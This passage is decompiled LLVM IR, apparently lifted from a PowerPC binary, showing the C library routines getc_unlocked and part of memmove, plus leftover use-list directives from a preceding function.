  uselistorder i32 %v0_100106ac, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10010674, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1001066c, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_10010638, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_10010628, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_1001061c, { 1, 0, 2 }
  uselistorder i32 %v1_10010600, { 0, 3, 2, 1 }
  uselistorder i32 %v2_100105b8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_100105a8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1001058c, { 1, 0 }
  uselistorder i32 %v1_10010568, { 1, 0 }
  uselistorder i32 %v2_10010548, { 1, 0, 2 }
  uselistorder i32 %v0_100104f0, { 1, 0 }
  uselistorder i32 %v1_10010354, { 1, 0 }
  uselistorder i32 %v0_100103e0, { 2, 1, 0 }
  uselistorder i32 %v1_10010328, { 1, 0 }
  uselistorder i32 %v1_10010308, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 4, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 4, 1, 6, 5, 7, 8, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 3, 4, 0, 5, 1, 6, 7, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 16, 15, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 29, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1 }
  uselistorder i32 45, { 1, 2, 0 }
  uselistorder i32 112, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1001d800.915 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010958, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100108b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010868.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10010854, { 1, 0 }
  uselistorder label %dec_label_pc_10010830, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010804, { 1, 0 }
  uselistorder label %dec_label_pc_100107f0, { 1, 0 }
  uselistorder label %dec_label_pc_100107d4, { 1, 0 }
  uselistorder label %dec_label_pc_100107ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001078c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010768, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001074c, { 1, 0 }
  uselistorder label %dec_label_pc_100106bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010658, { 1, 0 }
  uselistorder label %dec_label_pc_10010618, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100105dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100105b0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10010590, { 1, 0 }
  uselistorder label %dec_label_pc_1001051c, { 1, 0 }
  uselistorder label %dec_label_pc_1001040c, { 1, 0 }
  uselistorder label %dec_label_pc_10010364, { 1, 0 }
  uselistorder label %dec_label_pc_10010338, { 1, 0 }
  uselistorder label %dec_label_pc_1001032c, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_100109ac = load i32, i32* @lr, align 4
  store i32 %v0_100109ac, i32* %r0.global-to-local, align 4
  %v0_100109b4 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100109c0 = add i32 %tmp, 16
  %v3_100109c0 = inttoptr i32 %v2_100109c0 to i32*
  %v4_100109c0 = load i32, i32* %v3_100109c0, align 4
  store i32 %v4_100109c0, i32* %r9.global-to-local, align 4
  %v2_100109c4 = add i32 %tmp, 24
  %v3_100109c4 = inttoptr i32 %v2_100109c4 to i32*
  %v4_100109c4 = load i32, i32* %v3_100109c4, align 4
  store i32 %v4_100109c4, i32* %r0.global-to-local, align 4
  %v2_100109c8 = icmp ult i32 %v4_100109c0, %v4_100109c4
  br i1 %v2_100109c8, label %dec_label_pc_10010a30, label %dec_label_pc_100109d0

dec_label_pc_100109d0:                            ; preds = %entry
  %v3_100109d0 = load i16, i16* %arg1, align 2
  %v4_100109d0 = zext i16 %v3_100109d0 to i32
  %v1_100109d4 = and i32 %v4_100109d0, 131
  store i32 %v1_100109d4, i32* %r0.global-to-local, align 4
  %v2_100109d8 = icmp ugt i32 %v1_100109d4, 128
  br i1 %v2_100109d8, label %dec_label_pc_100109f0, label %dec_label_pc_100109e0

dec_label_pc_100109e0:                            ; preds = %dec_label_pc_100109d0
  store i32 268503528, i32* @lr, align 4
  %v3_100109e4 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_100109c0)
  store i32 %v3_100109e4, i32* %r3.global-to-local, align 4
  %v3_100109e8 = icmp eq i32 %v3_100109e4, 0
  br i1 %v3_100109e8, label %dec_label_pc_100109e0.dec_label_pc_100109f0_crit_edge, label %dec_label_pc_10010acc

dec_label_pc_100109e0.dec_label_pc_100109f0_crit_edge: ; preds = %dec_label_pc_100109e0
  %v0_100109f0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100109f0

dec_label_pc_100109f0:                            ; preds = %dec_label_pc_100109e0.dec_label_pc_100109f0_crit_edge, %dec_label_pc_100109d0
  %v2_10010a50 = phi i32 [ %v0_100109f0.pre, %dec_label_pc_100109e0.dec_label_pc_100109f0_crit_edge ], [ %tmp, %dec_label_pc_100109d0 ]
  %v1_100109f0 = inttoptr i32 %v2_10010a50 to i16*
  %v2_100109f0 = load i16, i16* %v1_100109f0, align 2
  %v3_100109f0 = zext i16 %v2_100109f0 to i32
  %v1_100109f4 = and i32 %v3_100109f0, 2
  store i32 %v1_100109f4, i32* %r0.global-to-local, align 4
  %v3_100109f4 = icmp eq i32 %v1_100109f4, 0
  br i1 %v3_100109f4, label %dec_label_pc_10010a20, label %dec_label_pc_100109fc

dec_label_pc_100109fc:                            ; preds = %dec_label_pc_100109f0
  %v1_100109fc = call i32 @__asm_rlwinm(i32 %v3_100109f0, i32 2, i32 29, i32 29)
  %v1_10010a00 = load i32, i32* @r31, align 4
  %v2_10010a00 = add i32 %v1_10010a00, %v1_100109fc
  store i32 %v2_10010a00, i32* %r9.global-to-local, align 4
  %v1_10010a04 = add i32 %v2_10010a00, 39
  %v2_10010a04 = inttoptr i32 %v1_10010a04 to i8*
  %v3_10010a04 = load i8, i8* %v2_10010a04, align 1
  %v4_10010a04 = zext i8 %v3_10010a04 to i32
  store i32 %v4_10010a04, i32* %r0.global-to-local, align 4
  %v1_10010a08 = add nsw i32 %v3_100109f0, -1
  store i32 %v1_10010a08, i32* %r9.global-to-local, align 4
  %v1_10010a0c = trunc i32 %v1_10010a08 to i16
  %v3_10010a0c = inttoptr i32 %v1_10010a00 to i16*
  store i16 %v1_10010a0c, i16* %v3_10010a0c, align 2
  %v0_10010a10 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10010a10, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10010a18 = load i32, i32* @r31, align 4
  %v2_10010a18 = add i32 %v1_10010a18, 40
  %v3_10010a18 = inttoptr i32 %v2_10010a18 to i32*
  store i32 0, i32* %v3_10010a18, align 4
  br label %dec_label_pc_10010ad0

dec_label_pc_10010a20:                            ; preds = %dec_label_pc_100109f0
  %v1_10010a20 = add i32 %v2_10010a50, 16
  %v2_10010a20 = inttoptr i32 %v1_10010a20 to i32*
  %v3_10010a20 = load i32, i32* %v2_10010a20, align 4
  store i32 %v3_10010a20, i32* %r9.global-to-local, align 4
  %v1_10010a24 = add i32 %v2_10010a50, 20
  %v2_10010a24 = inttoptr i32 %v1_10010a24 to i32*
  %v3_10010a24 = load i32, i32* %v2_10010a24, align 4
  store i32 %v3_10010a24, i32* %r0.global-to-local, align 4
  %v4_10010a28 = icmp eq i32 %v3_10010a24, %v3_10010a20
  br i1 %v4_10010a28, label %dec_label_pc_10010a3c, label %dec_label_pc_10010a30

dec_label_pc_10010a30:                            ; preds = %dec_label_pc_10010a20, %entry
  %v1_10010aa47 = phi i32 [ %v2_10010a50, %dec_label_pc_10010a20 ], [ %tmp, %entry ]
  %v0_10010a30 = phi i32 [ %v3_10010a20, %dec_label_pc_10010a20 ], [ %v4_100109c0, %entry ]
  %v1_10010a30 = inttoptr i32 %v0_10010a30 to i8*
  %v2_10010a30 = load i8, i8* %v1_10010a30, align 1
  %v3_10010a30 = zext i8 %v2_10010a30 to i32
  store i32 %v3_10010a30, i32* %r3.global-to-local, align 4
  %v1_10010a34 = add i32 %v0_10010a30, 1
  store i32 %v1_10010a34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10010aa4

dec_label_pc_10010a3c:                            ; preds = %dec_label_pc_10010a20
  %v1_10010a3c = add i32 %v2_10010a50, 4
  %v2_10010a3c = inttoptr i32 %v1_10010a3c to i32*
  %v3_10010a3c = load i32, i32* %v2_10010a3c, align 4
  store i32 %v3_10010a3c, i32* %r0.global-to-local, align 4
  %v3_10010a40 = icmp eq i32 %v3_10010a3c, -2
  br i1 %v3_10010a40, label %dec_label_pc_10010a48, label %dec_label_pc_10010a58

dec_label_pc_10010a48:                            ; preds = %dec_label_pc_10010a3c
  %v1_10010a48 = or i32 %v3_100109f0, 4
  store i32 %v1_10010a48, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10010a50 = trunc i32 %v1_10010a48 to i16
  store i16 %v1_10010a50, i16* %v1_100109f0, align 2
  br label %dec_label_pc_10010ad0

dec_label_pc_10010a58:                            ; preds = %dec_label_pc_10010a3c
  %v1_10010a58 = and i32 %v3_100109f0, 768
  store i32 %v1_10010a58, i32* %r0.global-to-local, align 4
  %v3_10010a58 = icmp eq i32 %v1_10010a58, 0
  br i1 %v3_10010a58, label %dec_label_pc_10010a6c, label %dec_label_pc_10010a60

dec_label_pc_10010a60:                            ; preds = %dec_label_pc_10010a58
  store i32 ptrtoint (i32** @global_var_1002e5d0.835 to i32), i32* %r3.global-to-local, align 4
  store i32 268503660, i32* @lr, align 4
  %v4_10010a68 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_1002e5d0.835 to i16*), i32 %v3_10010a20)
  store i32 %v4_10010a68, i32* %r3.global-to-local, align 4
  %v0_10010a6c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010a6c

dec_label_pc_10010a6c:                            ; preds = %dec_label_pc_10010a58, %dec_label_pc_10010a60
  %v0_10010aac = phi i32 [ %v2_10010a50, %dec_label_pc_10010a58 ], [ %v0_10010a6c.pre, %dec_label_pc_10010a60 ]
  %v1_10010a6c = add i32 %v0_10010aac, 8
  %v2_10010a6c = inttoptr i32 %v1_10010a6c to i32*
  %v3_10010a6c = load i32, i32* %v2_10010a6c, align 4
  store i32 %v3_10010a6c, i32* %r9.global-to-local, align 4
  %v1_10010a70 = add i32 %v0_10010aac, 12
  %v2_10010a70 = inttoptr i32 %v1_10010a70 to i32*
  %v3_10010a70 = load i32, i32* %v2_10010a70, align 4
  store i32 %v3_10010a70, i32* %r0.global-to-local, align 4
  %v4_10010a74 = icmp eq i32 %v3_10010a70, %v3_10010a6c
  br i1 %v4_10010a74, label %dec_label_pc_10010aac, label %dec_label_pc_10010a7c

dec_label_pc_10010a7c:                            ; preds = %dec_label_pc_10010a6c
  %v2_10010a7c = add i32 %v0_10010aac, 24
  %v3_10010a7c = inttoptr i32 %v2_10010a7c to i32*
  store i32 %v3_10010a6c, i32* %v3_10010a7c, align 4
  %v0_10010a80 = load i32, i32* @r31, align 4
  store i32 %v0_10010a80, i32* %r3.global-to-local, align 4
  store i32 268503688, i32* @lr, align 4
  %v3_10010a84 = call i32 @__stdio_rfill(i32 %v0_10010a80, i32 %v3_10010a6c)
  store i32 %v3_10010a84, i32* %r3.global-to-local, align 4
  %v3_10010a88 = icmp eq i32 %v3_10010a84, 0
  br i1 %v3_10010a88, label %dec_label_pc_10010acc, label %dec_label_pc_10010a90

dec_label_pc_10010a90:                            ; preds = %dec_label_pc_10010a7c
  %v0_10010a90 = load i32, i32* @r31, align 4
  %v1_10010a90 = add i32 %v0_10010a90, 20
  %v2_10010a90 = inttoptr i32 %v1_10010a90 to i32*
  %v3_10010a90 = load i32, i32* %v2_10010a90, align 4
  store i32 %v3_10010a90, i32* %r0.global-to-local, align 4
  %v1_10010a94 = add i32 %v0_10010a90, 16
  %v2_10010a94 = inttoptr i32 %v1_10010a94 to i32*
  %v3_10010a94 = load i32, i32* %v2_10010a94, align 4
  store i32 %v3_10010a94, i32* %r9.global-to-local, align 4
  %v2_10010a98 = add i32 %v0_10010a90, 24
  %v3_10010a98 = inttoptr i32 %v2_10010a98 to i32*
  store i32 %v3_10010a90, i32* %v3_10010a98, align 4
  %v0_10010a9c = load i32, i32* %r9.global-to-local, align 4
  %v1_10010a9c = add i32 %v0_10010a9c, 1
  store i32 %v1_10010a9c, i32* %r0.global-to-local, align 4
  %v1_10010aa0 = inttoptr i32 %v0_10010a9c to i8*
  %v2_10010aa0 = load i8, i8* %v1_10010aa0, align 1
  %v3_10010aa0 = zext i8 %v2_10010aa0 to i32
  store i32 %v3_10010aa0, i32* %r3.global-to-local, align 4
  %v1_10010aa4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010aa4

dec_label_pc_10010aa4:                            ; preds = %dec_label_pc_10010a30, %dec_label_pc_10010a90
  %v1_10010aa4 = phi i32 [ %v1_10010aa47, %dec_label_pc_10010a30 ], [ %v1_10010aa4.pre, %dec_label_pc_10010a90 ]
  %v0_10010aa4 = phi i32 [ %v1_10010a34, %dec_label_pc_10010a30 ], [ %v1_10010a9c, %dec_label_pc_10010a90 ]
  %v2_10010aa4 = add i32 %v1_10010aa4, 16
  %v3_10010aa4 = inttoptr i32 %v2_10010aa4 to i32*
  store i32 %v0_10010aa4, i32* %v3_10010aa4, align 4
  br label %dec_label_pc_10010ad0

dec_label_pc_10010aac:                            ; preds = %dec_label_pc_10010a6c
  %v1_10010aac = inttoptr i32 %v0_10010aac to i16*
  store i32 %v0_10010aac, i32* %r3.global-to-local, align 4
  %v2_10010ab0 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268503740, i32* @lr, align 4
  %v5_10010ab8 = call i32 @__stdio_READ(i16* %v1_10010aac, i32 %v2_10010ab0, i32 1)
  store i32 %v5_10010ab8, i32* %r3.global-to-local, align 4
  %v3_10010abc = icmp eq i32 %v5_10010ab8, 0
  br i1 %v3_10010abc, label %dec_label_pc_10010acc, label %dec_label_pc_10010ac4

dec_label_pc_10010ac4:                            ; preds = %dec_label_pc_10010aac
  %v3_10010ac4 = load i8, i8* %stack_var_-24, align 1
  %v4_10010ac4 = sext i8 %v3_10010ac4 to i32
  store i32 %v4_10010ac4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010ad0

dec_label_pc_10010acc:                            ; preds = %dec_label_pc_100109e0, %dec_label_pc_10010aac, %dec_label_pc_10010a7c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010ad0

dec_label_pc_10010ad0:                            ; preds = %dec_label_pc_10010ac4, %dec_label_pc_10010aa4, %dec_label_pc_10010a48, %dec_label_pc_100109fc, %dec_label_pc_10010acc
  store i32 %v0_100109ac, i32* %r0.global-to-local, align 4
  store i32 %v0_100109b4, i32* @r31, align 4
  %v0_10010ae0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010ae0

; uselistorder directives
  uselistorder i32 %v0_10010aac, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_10010a30, { 1, 0 }
  uselistorder i32 %v3_10010a20, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10010a00, { 1, 0 }
  uselistorder i32 %v3_100109f0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v2_10010a50, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 (i16*, i32)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* bitcast (i32** @global_var_1002e5d0.835 to i16*), { 1, 0 }
  uselistorder i16* @global_var_1002e2a8.228, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10010ad0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10010acc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10010aa4, { 1, 0 }
  uselistorder label %dec_label_pc_10010a6c, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_10010ae4 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_10010aec = load i32, i32* @r5, align 4
  store i32 %v0_10010aec, i32* @r11, align 4
  br i1 %v2_10010ae4, label %dec_label_pc_10010af8, label %dec_label_pc_10010af4

dec_label_pc_10010af4:                            ; preds = %entry
  %v0_10010af4 = call i32 @memcpy()
  store i32 %v0_10010af4, i32* @r3, align 4
  %v0_10010af8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10010af8

dec_label_pc_10010af8:                            ; preds = %entry, %dec_label_pc_10010af4
  %v0_10010af8 = phi i32 [ %v0_10010aec, %entry ], [ %v0_10010af8.pre, %dec_label_pc_10010af4 ]
  %v1_10010af8 = call i32 @__asm_rlwinm.(i32 %v0_10010af8, i32 29, i32 3, i32 31)
  store i32 %v1_10010af8, i32* %r9.global-to-local, align 4
  %v4_10010af8 = icmp eq i32 %v1_10010af8, 0
  %v1_10010afc = load i32, i32* @r5, align 4
  %v2_10010afc = add i32 %v1_10010afc, %arg2
  store i32 %v2_10010afc, i32* %r4.global-to-local, align 4
  %v0_10010b00 = load i32, i32* @r3, align 4
  %v2_10010b00 = add i32 %v0_10010b00, %v1_10010afc
  store i32 %v2_10010b00, i32* %r10.global-to-local, align 4
  br i1 %v4_10010af8, label %dec_label_pc_10010b28, label %dec_label_pc_10010b08

dec_label_pc_10010b08:                            ; preds = %dec_label_pc_10010af8
  %v1_10010b08 = urem i32 %v2_10010b00, 4
  %v3_10010b08 = icmp eq i32 %v1_10010b08, 0
  br i1 %v3_10010b08, label %dec_label_pc_10010b10, label %dec_label_pc_10010b5c

dec_label_pc_10010b10:                            ; preds = %dec_label_pc_10010b74.dec_label_pc_10010b10_crit_edge, %dec_label_pc_10010b08
  %v1_10010b1c.pre = phi i32 [ %v1_10010b1c.pre.pre, %dec_label_pc_10010b74.dec_label_pc_10010b10_crit_edge ], [ %v2_10010b00, %dec_label_pc_10010b08 ]
  %v0_10010b10 = phi i32 [ %v1_10010b74, %dec_label_pc_10010b74.dec_label_pc_10010b10_crit_edge ], [ %v1_10010af8, %dec_label_pc_10010b08 ]
  store i32 %v0_10010b10, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10010b14

dec_label_pc_10010b14:                            ; preds = %dec_label_pc_10010b14, %dec_label_pc_10010b10
  %v1_10010b1c = phi i32 [ %v2_10010b20, %dec_label_pc_10010b14 ], [ %v1_10010b1c.pre, %dec_label_pc_10010b10 ]
  %v0_10010b14 = load i32, i32* %r4.global-to-local, align 4
  %v1_10010b14 = add i32 %v0_10010b14, -4
  %v2_10010b14 = inttoptr i32 %v1_10010b14 to i32*
  %v3_10010b14 = load i32, i32* %v2_10010b14, align 4
  %v1_10010b18 = add i32 %v0_10010b14, -8
  %v2_10010b18 = inttoptr i32 %v1_10010b18 to i32*
  %v3_10010b18 = load i32, i32* %v2_10010b18, align 4
  store i32 %v3_10010b18, i32* %r9.global-to-local, align 4
  store i32 %v1_10010b18, i32* %r4.global-to-local, align 4
  %v2_10010b1c = add i32 %v1_10010b1c, -4
  %v3_10010b1c = inttoptr i32 %v2_10010b1c to i32*
  store i32 %v3_10010b14, i32* %v3_10010b1c, align 4
  %v0_10010b20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010b20 = load i32, i32* %r10.global-to-local, align 4
  %v2_10010b20 = add i32 %v1_10010b20, -8
  %v3_10010b20 = inttoptr i32 %v2_10010b20 to i32*
  store i32 %v0_10010b20, i32* %v3_10010b20, align 4
  store i32 %v2_10010b20, i32* %r10.global-to-local, align 4
  %v0_10010b24 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010b24 = add i32 %v0_10010b24, -1
  store i32 %v1_10010b24, i32* %ctr.global-to-local, align 4
  %v2_10010b24 = icmp eq i32 %v1_10010b24, 0
  br i1 %v2_10010b24, label %dec_label_pc_10010b28, label %dec_label_pc_10010b14

dec_label_pc_10010b28:                            ; preds = %dec_label_pc_10010b14, %dec_label_pc_10010b74, %dec_label_pc_10010af8
  %v0_10010b28 = load i32, i32* @r11, align 4
  %v1_10010b28 = urem i32 %v0_10010b28, 8
  store i32 %v1_10010b28, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_10010b28, 4
  br i1 %tmp, label %dec_label_pc_10010b40, label %dec_label_pc_10010b34

dec_label_pc_10010b34:                            ; preds = %dec_label_pc_10010b28
  %v0_10010b34 = load i32, i32* %r4.global-to-local, align 4
  %v1_10010b34 = add i32 %v0_10010b34, -4
  %v2_10010b34 = inttoptr i32 %v1_10010b34 to i32*
  %v3_10010b34 = load i32, i32* %v2_10010b34, align 4
  store i32 %v1_10010b34, i32* %r4.global-to-local, align 4
  %v1_10010b38 = add nsw i32 %v1_10010b28, -4
  store i32 %v1_10010b38, i32* %r5.global-to-local, align 4
  %v1_10010b3c = load i32, i32* %r10.global-to-local, align 4
  %v2_10010b3c = add i32 %v1_10010b3c, -4
  %v3_10010b3c = inttoptr i32 %v2_10010b3c to i32*
  store i32 %v3_10010b34, i32* %v3_10010b3c, align 4
  store i32 %v2_10010b3c, i32* %r10.global-to-local, align 4
  %v0_10010b40.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010b40

dec_label_pc_10010b40:                            ; preds = %dec_label_pc_10010b28, %dec_label_pc_10010b34
  %v0_10010b48 = phi i32 [ %v1_10010b28, %dec_label_pc_10010b28 ], [ %v0_10010b40.pre, %dec_label_pc_10010b34 ]
  %v3_10010b40 = icmp eq i32 %v0_10010b48, 0
  br i1 %v3_10010b40, label %dec_label_pc_10010b80, label %dec_label_pc_10010b48

dec_label_pc_10010b48:                            ; preds = %dec_label_pc_10010b40
  store i32 %v0_10010b48, i32* %ctr.global-to-local, align 4
  %v2_10010b50.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010b4c

dec_label_pc_10010b4c:                            ; preds = %dec_label_pc_10010b4c, %dec_label_pc_10010b48
  %v2_10010b50 = phi i32 [ %v3_10010b50, %dec_label_pc_10010b4c ], [ %v2_10010b50.pre, %dec_label_pc_10010b48 ]
  %v0_10010b4c = load i32, i32* %r4.global-to-local, align 4
  %v1_10010b4c = add i32 %v0_10010b4c, -1
  %v2_10010b4c = inttoptr i32 %v1_10010b4c to i8*
  %v3_10010b4c = load i8, i8* %v2_10010b4c, align 1
  store i32 %v1_10010b4c, i32* %r4.global-to-local, align 4
  %v3_10010b50 = add i32 %v2_10010b50, -1
  %v4_10010b50 = inttoptr i32 %v3_10010b50 to i8*
  store i8 %v3_10010b4c, i8* %v4_10010b50, align 1
  store i32 %v3_10010b50, i32* %r10.global-to-local, align 4
  %v0_10010b54 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010b54 = add i32 %v0_10010b54, -1
  store i32 %v1_10010b54, i32* %ctr.global-to-local, align 4
  %v2_10010b54 = icmp eq i32 %v1_10010b54, 0
  br i1 %v2_10010b54, label %dec_label_pc_10010b80, label %dec_label_pc_10010b4c

dec_label_pc_10010b5c:                            ; preds = %dec_label_pc_10010b08
  %v1_10010b5c = sub nsw i32 4, %v1_10010b08
  store i32 %v1_10010b5c, i32* %ctr.global-to-local, align 4
  %v2_10010b64 = sub i32 %v1_10010afc, %v1_10010b5c
  store i32 %v2_10010b64, i32* @r11, align 4
  %v1_10010b689 = add i32 %v2_10010afc, -1
  %v2_10010b6810 = inttoptr i32 %v1_10010b689 to i8*
  %v3_10010b6811 = load i8, i8* %v2_10010b6810, align 1
  store i32 %v1_10010b689, i32* %r4.global-to-local, align 4
  %v3_10010b6c13 = add i32 %v2_10010b00, -1
  %v4_10010b6c14 = inttoptr i32 %v3_10010b6c13 to i8*
  store i8 %v3_10010b6811, i8* %v4_10010b6c14, align 1
  store i32 %v3_10010b6c13, i32* %r10.global-to-local, align 4
  %v0_10010b7015 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010b7016 = add i32 %v0_10010b7015, -1
  store i32 %v1_10010b7016, i32* %ctr.global-to-local, align 4
  %v2_10010b7017 = icmp eq i32 %v1_10010b7016, 0
  br i1 %v2_10010b7017, label %dec_label_pc_10010b74, label %dec_label_pc_10010b68.dec_label_pc_10010b68_crit_edge

dec_label_pc_10010b68.dec_label_pc_10010b68_crit_edge: ; preds = %dec_label_pc_10010b5c, %dec_label_pc_10010b68.dec_label_pc_10010b68_crit_edge
  %v3_10010b6c18 = phi i32 [ %v3_10010b6c, %dec_label_pc_10010b68.dec_label_pc_10010b68_crit_edge ], [ %v3_10010b6c13, %dec_label_pc_10010b5c ]
  %v0_10010b68.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10010b68 = add i32 %v0_10010b68.pre, -1
  %v2_10010b68 = inttoptr i32 %v1_10010b68 to i8*
  %v3_10010b68 = load i8, i8* %v2_10010b68, align 1
  store i32 %v1_10010b68, i32* %r4.global-to-local, align 4
  %v3_10010b6c = add i32 %v3_10010b6c18, -1
  %v4_10010b6c = inttoptr i32 %v3_10010b6c to i8*
  store i8 %v3_10010b68, i8* %v4_10010b6c, align 1
  store i32 %v3_10010b6c, i32* %r10.global-to-local, align 4
  %v0_10010b70 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010b70 = add i32 %v0_10010b70, -1
  store i32 %v1_10010b70, i32* %ctr.global-to-local, align 4
  %v2_10010b70 = icmp eq i32 %v1_10010b70, 0
  br i1 %v2_10010b70, label %dec_label_pc_10010b74, label %dec_label_pc_10010b68.dec_label_pc_10010b68_crit_edge

dec_label_pc_10010b74:                            ; preds = %dec_label_pc_10010b68.dec_label_pc_10010b68_crit_edge, %dec_label_pc_10010b5c
  %v0_10010b74 = load i32, i32* @r11, align 4
  %v1_10010b74 = call i32 @__asm_rlwinm.(i32 %v0_10010b74, i32 29, i32 3, i32 31)
  store i32 %v1_10010b74, i32* %r9.global-to-local, align 4
  %v4_10010b74 = icmp eq i32 %v1_10010b74, 0
